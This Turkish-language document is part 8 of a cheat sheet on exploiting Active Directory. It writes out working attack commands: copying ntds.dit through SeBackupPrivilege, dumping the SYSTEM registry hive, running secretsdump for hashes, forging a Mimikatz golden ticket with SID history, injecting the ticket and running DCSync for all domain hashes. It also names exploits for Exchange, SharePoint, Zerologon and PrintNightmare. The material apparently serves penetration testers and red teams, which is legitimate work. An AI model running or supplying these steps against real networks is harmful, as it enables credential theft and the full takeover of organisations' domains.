# Active Directory Exploitation Cheat Sheet - Bölüm 8

## Shadow Copy İşlemleri

### Diskshadow ile Shadow Copy Oluşturma:
```bash
diskshadow /s script.txt
```

### Shadow Copy'ye Erişim:
- **SeBackupPrivilege Kullanarak ntds.dit Dosyasını Kopyalama:**
```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

# SeBackupPrivilege Etkin mi Kontrol Etme:
Get-SeBackupPrivilege

# Eğer Değilse Etkinleştirme:
Set-SeBackupPrivilege

# ntds.dit Dosyasını Kopyalama:
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
```

### SYSTEM Hive'i Dump Etme:
```bash
reg save HKLM\SYSTEM c:\temp\system.hive
```

### Lokalde İşleme:
- **ntds.dit ve SYSTEM Hive Dosyalarını Kopyalama:**
  Impacket'ten smbclient.py veya başka bir araç kullanarak kopyalayabilirsiniz.

- **Hash Dump Etmek için secretsdump.py Kullanma:**
  ```bash
  secretsdump.py <Domain>/<User>@<Target>
  ```

- **PTH ile Domain Admin Erişimi Sağlama:**
  PsExec veya diğer araçları kullanabilirsiniz.

## Exchange İstismarı

### Exchange Üzerinden DA Yetkisi:
- **CVE-2020-0688:** Exchange Sunucularındaki bir güvenlik açığını kullanarak DA yetkisi.
- **PrivExchange:** Exchange'i suistimal ederek Domain Admin yetkisi.

## Yazıcı Hataları ile Yetki Yükseltme

### Printer Server Bug ile Domain Admin:
- **NetNTLM to Silver Ticket:** Yazıcı hatalarını kullanarak yetki yükseltme.

## ACL'lerin Suistimali

### Active Directory ACL'leri Kullanarak Yetki Yükseltme:
- **aclpwn.py veya Invoke-ACLPwn Kullanımı:** ACL manipülasyonları ile DA yetkisi.

## IPv6 Suistimali

### IPv4 Ağlarını IPv6 ile Ele Geçirme:
- **mitm6 Aracı Kullanımı:** IPv6'ya geçiş yaparak IPv4 ağlarını suistimal etme.

## SID History Abuse

### Açıklama:
Eğer bir forest'ın child domain'ini ele geçirirsek ve SID filtering devre dışıysa, SID History alanını kullanarak root domain'in Domain Admin yetkilerini elde edebiliriz.

### İstismar Örneği:
- **Mevcut Domain'in SID'ini Alma:**
  ```powershell
  Get-DomainSID -Domain current.root.domain.local
  ```

- **Root Domain'in SID'ini Alma:**
  ```powershell
  Get-DomainSID -Domain root.domain.local
  ```

- **Enterprise Admins SID Oluşturma:**
  Format: `RootDomainSID-519`

- **Golden Ticket Oluşturma:**
  ```mimikatz
  kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi
  ```

- **Golden Ticket'i Belleğe Enjekte Etme:**
  ```mimikatz
  kerberos::ptt \path\to\ticket\golden.kirbi
  ```

- **Root Domain'in DC'sine Erişim:**
  ```bash
dir \\dc.root.domain.local\C$
  ```

- **DCsync ile Hash Dump Etme:**
  ```mimikatz
  lsadump::dcsync /domain:root.domain.local /all
  ```

## SharePoint İstismarı

- **CVE-2019-0604:** RCE İstismarı.
- **CVE-2019-1257:** BDC deserialization ile kod çalıştırma.
- **CVE-2020-0932:** TypeConverters kullanarak RCE.

## Zerologon

### Açıklama:
Zerologon, kimlik doğrulama gerektirmeyen bir DC ele geçirme açığıdır.
- **SharpZeroLogon:** Zerologon exploitinin C# implementasyonu.
- **Invoke-ZeroLogon:** Powershell ile Zerologon exploit.
- **Zer0Dump:** Impacket kütüphanesiyle Python'da Zerologon exploit.

## PrintNightmare

### Açıklama:
- **CVE-2021-34527:** PrintNightmare açığının detayları.
- **Impacket Implementasyonu:** Güvenilir bir PrintNightmare PoC.
- **C# Implementasyonu:** PrintNightmare'ın C# ile yazılmış PoC'si.

## Active Directory Sertifika Hizmetleri

### Güvenlik Açığı Olan Sertifika Şablonlarını Kontrol Etme:
- **Certify Kullanımı:**
  ```bash
  .\Certify.exe find /vulnerable /quiet
  ```

- **Not:** Certify, Cobalt Strike'ın `execute-assembly` komutuyla çalıştırılabilir.
